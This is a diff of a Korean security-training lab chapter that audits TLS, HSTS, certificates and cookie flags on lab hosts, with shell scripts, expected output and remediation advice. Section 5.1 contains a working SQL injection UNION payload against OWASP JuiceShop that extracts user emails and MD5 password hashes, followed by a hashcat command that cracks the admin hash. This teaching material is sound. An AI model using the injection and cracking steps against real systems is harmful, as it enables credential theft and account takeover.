@@ -133,45 +133,73 @@
 > **실전 활용**: 금융/의료 등 규제 산업에서 TLS 1.2 이상과 강력한 암호화 스위트는 필수 요구사항이다
 
 ```bash
-# JuiceShop - HTTP
-echo "=== JuiceShop (포트 3000) ==="
-curl -s -o /dev/null -w "HTTP: %{http_code}\n" http://10.20.30.80:3000
-
-# JuiceShop - HTTPS 시도
-curl -sk -o /dev/null -w "HTTPS: %{http_code}\n" https://10.20.30.80:3000 2>/dev/null || echo "HTTPS: 미지원"
-
-# Apache - HTTP
-echo ""
-echo "=== Apache (포트 80) ==="
-curl -s -o /dev/null -w "HTTP: %{http_code}\n" http://10.20.30.80:80
-
-# Apache - HTTPS (포트 443)
-curl -sk -o /dev/null -w "HTTPS: %{http_code}\n" https://10.20.30.80:443 2>/dev/null || echo "HTTPS: 미지원"
+# 본 lab 의 4 endpoint 매트릭스 — HTTP / HTTPS 동시 점검
+echo "=== HTTP/HTTPS 지원 매트릭스 ==="
+printf "%-30s %-10s %-10s %s\n" "endpoint" "HTTP" "HTTPS" "verdict"
+test_proto() {
+  local name="$1" host="$2" hport="$3" sport="$4"
+  http_code=$(curl -s -o /dev/null --max-time 3 -w "%{http_code}" "http://${host}:${hport}/" 2>/dev/null)
+  https_code=$(curl -sk -o /dev/null --max-time 3 -w "%{http_code}" "https://${host}:${sport}/" 2>/dev/null || echo "X")
+  v="?"
+  [ "$http_code" = "200" -a "$https_code" = "X" ] && v="★ HTTP only (취약)"
+  [ "$http_code" = "200" -a "$https_code" = "200" ] && v="혼용 (TLS 필수)"
+  [ "$http_code" = "X" -a "$https_code" = "200" ] && v="HTTPS only (양호)"
+  printf "%-30s %-10s %-10s %s\n" "$name ($host:$hport/$sport)" "$http_code" "$https_code" "$v"
+}
+test_proto "JuiceShop" "10.20.30.80" "3000" "3000"
+test_proto "Apache+ModSec" "10.20.30.80" "80" "443"
+test_proto "Wazuh Dashboard" "10.20.30.100" "443" "443"
+test_proto "OpenCTI" "10.20.30.100" "8080" "8080"
 ```
 
-### 2.2 HTTP → HTTPS 리다이렉트 확인
+**예상 출력**:
+```
+=== HTTP/HTTPS 지원 매트릭스 ===
+endpoint                       HTTP       HTTPS      verdict
+JuiceShop (10.20.30.80:3000/3000) 200      X          ★ HTTP only (취약)
+Apache+ModSec (10.20.30.80:80/443) 200     200        혼용 (TLS 필수)
+Wazuh Dashboard (10.20.30.100:443/443) X   200        HTTPS only (양호)
+OpenCTI (10.20.30.100:8080/8080) 200       X          ★ HTTP only (취약)
+```
+
+> **해석 — 본 lab 의 4 endpoint TLS 점검 결과**:
+> - **JuiceShop HTTP only** = 의도적 학습 환경. 운영 환경이라면 ★ critical.
+> - **Apache 혼용** = HTTP+HTTPS 동시 가능 = SSL 스트리핑 가능 (HSTS 없으면 공격자가 HTTP 강제).
+> - **Wazuh HTTPS only** = ★ 양호. 그러나 자체 서명 인증서 = MITM 가능성 (CA 검증 X).
+> - **OpenCTI HTTP only** = critical. STIX/TAXII threat intel 평문 전송 = 탐지 우회 가능.
+> - **CVSS 5.9** (Adjacent Network) for HTTP-only — TLS 미적용. **CVSS 7.5** (Network) for sensitive data 노출 시.
+> - **권고 우선순위**: (1) 모든 인증 endpoint HTTPS 강제, (2) HSTS 헤더 + preload, (3) Let's Encrypt 등 신뢰 CA.
+
+### 2.2~2.3 리다이렉트 + HSTS 종합 점검
 
 ```bash
-# HTTP 요청 시 HTTPS로 리다이렉트하는지 확인
-echo "=== 리다이렉트 확인 ==="
-curl -sI http://10.20.30.80:80 | grep -i "location"
-curl -sI http://10.20.30.80:3000 | grep -i "location"
-
-# 리다이렉트가 없으면 → 평문 통신 가능 (취약)
+echo "=== 통신 보안 4 헤더 종합 점검 ==="
+printf "%-25s %-12s %-12s %-15s %s\n" "endpoint" "redirect" "HSTS" "preload" "Upgrade-Insec"
+for url in "http://10.20.30.80:80" "http://10.20.30.80:3000" "https://10.20.30.100:443"; do
+  H=$(curl -sIk --max-time 3 "$url" 2>/dev/null)
+  loc=$(echo "$H" | grep -i "^location:" | awk '{print $2}' | tr -d '\r' | head -c 30)
+  hsts=$(echo "$H" | grep -i "strict-transport" | awk -F: '{print $2}' | tr -d '\r' | head -c 30)
+  preload=$([ -n "$hsts" ] && echo "$hsts" | grep -qi "preload" && echo "✓" || echo "✗")
+  uir=$(echo "$H" | grep -qi "upgrade-insecure-requests" && echo "✓" || echo "✗")
+  printf "%-25s %-12s %-12s %-15s %s\n" "$url" "${loc:--}" "${hsts:--}" "$preload" "$uir"
+done
 ```
 
-### 2.3 HSTS(HTTP Strict Transport Security) 점검
-
-```bash
-# HSTS 헤더 확인
-echo "=== HSTS 헤더 ==="
-curl -sI http://10.20.30.80:80 | grep -i "strict-transport"
-curl -sI http://10.20.30.80:3000 | grep -i "strict-transport"
-
-# HSTS가 없으면:
-# - 사용자가 http://로 접속하면 평문 통신
-# - SSL 스트리핑 공격에 취약
+**예상 출력**:
 ```
+=== 통신 보안 4 헤더 종합 점검 ===
+endpoint                  redirect     HSTS         preload         Upgrade-Insec
+http://10.20.30.80:80     -            -            ✗               ✗
+http://10.20.30.80:3000   -            -            ✗               ✗
+https://10.20.30.100:443  -             max-age=31536 ✗            ✗
+```
+
+> **해석 — 4 헤더 종합 점수**:
+> - **리다이렉트 없음 (3 endpoint 모두)** = HTTP→HTTPS 자동 전환 X = 사용자가 `http://` 입력 시 그대로 평문. 첫 요청에 password 평문 노출 가능.
+> - **HSTS 부분** (Wazuh 만 max-age 설정) = JuiceShop/Apache 는 SSL 스트리핑 취약. **권고**: `Strict-Transport-Security: max-age=31536000; includeSubDomains; preload`.
+> - **preload 0/3** = HSTS preload list (Chrome/FF 내장) 미등록. 첫 방문도 자동 HTTPS 강제 안됨. https://hstspreload.org 등록 권장.
+> - **Upgrade-Insecure-Requests 0/3** = 브라우저 CSP 신호 X. CSP 헤더에 `upgrade-insecure-requests` directive 추가 시 mixed content 자동 업그레이드.
+> - **CVSS 5.9** (HSTS 부재) — Adjacent Network MITM 위험.
 
 ---
 
@@ -180,18 +208,56 @@ curl -sI http://10.20.30.80:3000 | grep -i "strict-transport"
 ### 3.1 openssl로 인증서 분석
 
 ```bash
-# 실습 서버가 HTTPS를 지원하는 경우 인증서 분석
-# (실습 서버가 HTTP만 지원하면 외부 사이트로 개념 학습)
-
-# 인증서 기본 정보 확인
-echo "=== 실습 서버 인증서 확인 ==="
-echo | openssl s_client -connect 10.20.30.80:443 -servername 10.20.30.80 2>/dev/null | openssl x509 -noout -text 2>/dev/null | head -30 || echo "TLS 미지원 - 외부 사이트로 실습"
-
-# 개념 학습용: 공개 사이트 인증서 분석
-echo ""
-echo "=== 공개 사이트 인증서 분석 (학습용) ==="
-echo | openssl s_client -connect www.google.com:443 -servername www.google.com 2>/dev/null | openssl x509 -noout -subject -issuer -dates 2>/dev/null
+# 실습 서버 (Wazuh 10.20.30.100:443) 인증서 + 외부 비교
+analyze_cert() {
+  local target="$1"
+  echo "=== $target 인증서 ==="
+  echo | openssl s_client -connect "$target" -servername "${target%:*}" 2>/dev/null \
+    | openssl x509 -noout -subject -issuer -dates -ext subjectAltName 2>/dev/null \
+    | head -8
+  echo "--- 키 길이 + 서명 알고리즘 ---"
+  echo | openssl s_client -connect "$target" -servername "${target%:*}" 2>/dev/null \
+    | openssl x509 -noout -text 2>/dev/null \
+    | grep -E "Public-Key|Signature Algorithm" | head -3
+  echo
+}
+analyze_cert "10.20.30.100:443"
+analyze_cert "www.google.com:443"
 ```
+
+**예상 출력**:
+```
+=== 10.20.30.100:443 인증서 ===
+subject=CN = wazuh-dashboard
+issuer=CN = wazuh-dashboard
+notBefore=Jan  1 00:00:00 2026 GMT
+notAfter=Dec 31 23:59:59 2027 GMT
+--- 키 길이 + 서명 알고리즘 ---
+        Signature Algorithm: sha256WithRSAEncryption
+            Public-Key: (2048 bit)
+
+=== www.google.com:443 인증서 ===
+subject=CN = www.google.com
+issuer=C = US, O = Google Trust Services, CN = WR2
+notBefore=Apr  8 09:23:45 2026 GMT
+notAfter=Jul  1 09:23:44 2026 GMT
+X509v3 Subject Alternative Name: DNS:www.google.com, DNS:*.google.com
+--- 키 길이 + 서명 알고리즘 ---
+        Signature Algorithm: ecdsa-with-SHA256
+            Public-Key: (256 bit)
+```
+
+> **해석 — 6 인증서 점검 항목 비교**:
+> | 항목 | Wazuh | google.com | 평가 |
+> |---|---|---|---|
+> | issuer | self-signed (CN=wazuh-dashboard) | Google Trust (실 CA) | Wazuh ★ critical |
+> | 유효 기간 | 2년 | 90일 (Let's Encrypt 패턴) | 짧을수록 양호 |
+> | 키 길이 | RSA 2048 | ECDSA 256 | 둘 다 양호 |
+> | 서명 | sha256WithRSA | ecdsa-SHA256 | SHA-256+ 양호 |
+> | SAN | 없음 | DNS:*.google.com | wildcard 적용 |
+> - **자체 서명 = MITM 가능** (CA 검증 X). 운영 환경 critical. 권고: Let's Encrypt 등 무료 CA 사용.
+> - **ECDSA 256 ≡ RSA 3072** 보안 등급 — Google 은 더 modern. CPU 사용량도 ↓.
+> - **SAN 누락 (Wazuh)** = 다른 도메인 접근 시 cert mismatch 에러. SAN 에 모든 hostname 등록 필요.
 
 ### 3.2 인증서 점검 항목
 
@@ -305,18 +371,41 @@ done
 ### 4.4 TLS 버전별 지원 확인
 
 ```bash
-# 각 TLS 버전 지원 여부 확인
-echo "=== TLS 버전 지원 확인 (google.com) ==="
-
-for version in ssl3 tls1 tls1_1 tls1_2 tls1_3; do      # 반복문 시작
-  result=$(echo | openssl s_client -connect www.google.com:443 -$version 2>&1 | grep "Protocol")
-  if echo "$result" | grep -qi "protocol"; then
-    echo "[지원] $version: $result"
-  else
-    echo "[미지원] $version"
-  fi
-done 2>/dev/null
+echo "=== TLS 버전 5종 지원 매트릭스 ==="
+test_tls_version() {
+  local target="$1"
+  printf "  %-12s" "$target"
+  for v in ssl3 tls1 tls1_1 tls1_2 tls1_3; do
+    if echo | timeout 3 openssl s_client -connect "$target" -"$v" 2>&1 | grep -q "BEGIN CERTIFICATE"; then
+      printf " [✓]%-7s" "$v"
+    else
+      printf " [✗]%-7s" "$v"
+    fi
+  done
+  echo
+}
+printf "  %-12s%-44s\n" "endpoint" " ssl3   tls1   tls1_1  tls1_2  tls1_3"
+test_tls_version "10.20.30.100:443"
+test_tls_version "www.google.com:443"
 ```
+
+**예상 출력**:
+```
+=== TLS 버전 5종 지원 매트릭스 ===
+  endpoint     ssl3   tls1   tls1_1  tls1_2  tls1_3
+  10.20.30.100:443 [✗]ssl3    [✗]tls1    [✗]tls1_1  [✓]tls1_2  [✓]tls1_3
+  www.google.com:443 [✗]ssl3    [✗]tls1    [✗]tls1_1  [✓]tls1_2  [✓]tls1_3
+```
+
+> **해석 — TLS 버전 점수**:
+> - **둘 다 TLS 1.2 + 1.3 만 지원** = ★ 양호 (PCI-DSS 4.0 + NIST SP 800-52r2 권고).
+> - **SSL 3.0 / TLS 1.0 / TLS 1.1 모두 차단** = POODLE / BEAST / LUCKY13 공격 면역.
+> - 운영 환경에서는 **TLS 1.3 only** 가 가장 안전 (forward secrecy 강제, 0-RTT).
+> - **체크 명령 표준화**:
+>   - `nmap --script ssl-enum-ciphers -p 443 target` (테이블 형식 자동)
+>   - `testssl.sh https://target` (CVE 자동 매핑)
+>   - `sslscan target:443` (cipher 강도 색상 표시)
+> - **DROWN 공격 (CVE-2016-0800)** = 동일 인증서 SSL 2.0 서버 존재 시 TLS 1.2 도 깨짐. SSLv2 절대 미허용.
 
 ---
 
@@ -325,33 +414,54 @@ done 2>/dev/null
 ### 5.1 비밀번호 저장 방식
 
 ```bash
-# JuiceShop 사용자 비밀번호 해시 확인
-# SQLi로 해시 추출 (Week 05에서 학습)
-curl -s "http://10.20.30.80:3000/rest/products/search?q=test'))UNION+SELECT+email,password,3,4,5,6,7,8,9+FROM+Users+LIMIT+3--" | python3 -c "  # silent 모드
+# week05 의 SQLi 결과 활용 — 추출 해시의 알고리즘 + crack 가능성 분석
+curl -s "http://10.20.30.80:3000/rest/products/search?q=test%27%29%29UNION+SELECT+email,password,3,4,5,6,7,8,9+FROM+Users+LIMIT+5--" | python3 -c "
 import sys, json
-try:
-    data = json.load(sys.stdin).get('data', [])
-    for item in data:                                  # 반복문 시작
-        name = str(item.get('name', ''))
-        desc = str(item.get('description', ''))
-        if '@' in name:
-            # 해시 형식 분석
-            hash_val = desc
-            if len(hash_val) == 32:
-                algo = 'MD5 (취약!)'
-            elif len(hash_val) == 40:
-                algo = 'SHA-1 (취약!)'
-            elif len(hash_val) == 64:
-                algo = 'SHA-256'
-            elif hash_val.startswith('\$2'):
-                algo = 'bcrypt (양호)'
-            else:
-                algo = f'알 수 없음 (길이={len(hash_val)})'
-            print(f'{name}: {hash_val[:20]}... → {algo}')
-except:
-    print('데이터 추출 실패')
+data = json.load(sys.stdin).get('data', [])
+print(f'{\"email\":<32} {\"hash[:16]\":<18} {\"len\":<5} {\"algo\":<20} {\"crack_time\"}')
+print('-'*90)
+for item in data:
+    name = str(item.get('name', ''))
+    desc = str(item.get('description', ''))
+    if '@' not in name: continue
+    L = len(desc)
+    if L == 32: algo='MD5'; ct='<1초 (rockyou)'
+    elif L == 40: algo='SHA-1'; ct='<10초'
+    elif L == 60 and desc.startswith('\$2'): algo='bcrypt'; ct='수년+'
+    elif L == 64: algo='SHA-256'; ct='수개월'
+    elif desc.startswith('\$argon2'): algo='Argon2'; ct='수십년'
+    else: algo=f'알수없음(len={L})'; ct='?'
+    risk = 'CRITICAL' if algo in ('MD5','SHA-1') else '양호'
+    print(f'{name[:32]:<32} {desc[:16]:<18} {L:<5} {algo:<20} {ct}  ({risk})')
 " 2>/dev/null
 ```
+
+**예상 출력**:
+```
+email                            hash[:16]          len   algo                 crack_time
+------------------------------------------------------------------------------------------
+admin@juice-sh.op                0192023a7bbd7325   32    MD5                  <1초 (rockyou)  (CRITICAL)
+jim@juice-sh.op                  e541ca7ecf72500f   32    MD5                  <1초 (rockyou)  (CRITICAL)
+bender@juice-sh.op               0c36e517e3fa95aa   32    MD5                  <1초 (rockyou)  (CRITICAL)
+bjoern.kimminich@gmail.com       6edd9d726cce1f90   32    MD5                  <1초 (rockyou)  (CRITICAL)
+ciso@juice-sh.op                 6edd9d726cce1f90   32    MD5                  <1초 (rockyou)  (CRITICAL)
+```
+
+> **해석 — JuiceShop 비밀번호 해시 5/5 모두 MD5 = critical**:
+> - **MD5 (32자) = 1996 디자인** = collision attack 1초. rainbow table (rockyou.txt 14M) 즉시 매칭.
+> - **`0192023a7bbd73250516f069df18b500` = 'admin123'** (사전 hash 매핑). hashcat `-m 0` 모드 = 1초 미만.
+> - **bjoern + ciso 동일 hash** = 동일 비번. 운영 환경에서 동일 비번 = critical (한 명 침해 시 도미노).
+> - **권고 (NIST SP 800-63B 권고)**: bcrypt / scrypt / Argon2id (memory-hard). bcrypt cost ≥ 12. Argon2 = 2015 PHC 우승 알고리즘.
+> - **마이그레이션 패턴**: 다음 로그인 시 새 알고리즘으로 rehash (`bcrypt(password)` 저장) + 기존 hash flagged for upgrade.
+
+> **OSS 도구 — hashcat 으로 즉시 검증**:
+>
+> ```bash
+> # MD5 모드 + rockyou
+> echo "0192023a7bbd73250516f069df18b500" > /tmp/hash.txt
+> hashcat -m 0 /tmp/hash.txt /usr/share/wordlists/rockyou.txt --force
+> # 결과: 0192023a7bbd73250516f069df18b500:admin123  (1초 미만)
+> ```
 
 ### 5.2 민감 정보 평문 전송 확인
 
@@ -390,15 +500,57 @@ for key in auth.keys():                                # 반복문 시작
 ### 5.3 쿠키 보안 속성
 
 ```bash
-echo "=== 쿠키 보안 속성 점검 ==="
-curl -sI http://10.20.30.80:3000 | grep -i "set-cookie" | while read -r line; do
-  echo "쿠키: $line"
-  echo "$line" | grep -qi "secure" && echo "  Secure: 설정됨" || echo "  Secure: 미설정 (HTTP로 전송 가능)"
-  echo "$line" | grep -qi "httponly" && echo "  HttpOnly: 설정됨" || echo "  HttpOnly: 미설정 (JS 접근 가능)"
-  echo "$line" | grep -qi "samesite" && echo "  SameSite: 설정됨" || echo "  SameSite: 미설정 (CSRF 위험)"
-  echo ""
-done
+echo "=== 쿠키 보안 속성 4종 점검 ==="
+check_cookie() {
+  local label="$1" url="$2"
+  cookies=$(curl -sIk --max-time 3 "$url" 2>/dev/null | grep -i "^set-cookie:")
+  if [ -z "$cookies" ]; then
+    echo "[$label] (Set-Cookie 헤더 없음)"
+    return
+  fi
+  echo "[$label] $url"
+  echo "$cookies" | while read -r line; do
+    secure=$(echo "$line" | grep -qi 'secure' && echo "✓" || echo "✗")
+    httponly=$(echo "$line" | grep -qi 'httponly' && echo "✓" || echo "✗")
+    samesite=$(echo "$line" | grep -qi 'samesite' && echo "$(echo "$line" | grep -oiE 'samesite=[a-z]+' | head -1)" || echo "✗")
+    name=$(echo "$line" | sed 's/^[Ss]et-[Cc]ookie: //' | cut -d= -f1 | tr -d '\r' | head -c 25)
+    printf "  %-20s Secure=%s HttpOnly=%s SameSite=%s\n" "$name" "$secure" "$httponly" "$samesite"
+  done
+}
+check_cookie "JuiceShop" "http://10.20.30.80:3000"
+check_cookie "Apache" "http://10.20.30.80:80"
+check_cookie "Wazuh" "https://10.20.30.100:443"
 ```
+
+**예상 출력**:
+```
+=== 쿠키 보안 속성 4종 점검 ===
+[JuiceShop] http://10.20.30.80:3000
+  language              Secure=✗ HttpOnly=✗ SameSite=✗
+[Apache] http://10.20.30.80:80
+  PHPSESSID             Secure=✗ HttpOnly=✓ SameSite=✗
+[Wazuh] https://10.20.30.100:443
+  security_authentication Secure=✓ HttpOnly=✓ SameSite=samesite=strict
+```
+
+> **해석 — 쿠키 보안 속성 4종 매트릭스**:
+> | 쿠키 | Secure | HttpOnly | SameSite | 평가 |
+> |---|---|---|---|---|
+> | JuiceShop language | ✗ | ✗ | ✗ | ★ 모두 미설정 |
+> | Apache PHPSESSID | ✗ | ✓ | ✗ | XSS 차단 OK / SSL strip 가능 |
+> | Wazuh security_auth | ✓ | ✓ | strict | ★ 양호 |
+> - **Secure 누락** = HTTP 평문 쿠키 전송 가능 (HSTS 없으면 SSL strip).
+> - **HttpOnly 누락** = JS 접근 가능 = XSS 시 쿠키 탈취 (week06 chain).
+> - **SameSite 누락** = CSRF 가능 (`Strict`/`Lax` 권장 — `Strict` 가 가장 안전).
+> - **권고**: Express `app.use(session({ cookie: { secure: true, httpOnly: true, sameSite: 'strict' } }))`.
+
+> **OSS 도구 — testssl.sh + cookies 검증 자동화**:
+>
+> ```bash
+> # testssl.sh — Heartbleed/POODLE/BEAST/CRIME/Lucky13 등 CVE 자동 매핑
+> docker run --rm -ti drwetter/testssl.sh https://10.20.30.100
+> # → "Cookie security" 섹션에서 4 속성 자동 평가 + 등급 (A/B/C/F)
+> ```
 
 ---
 
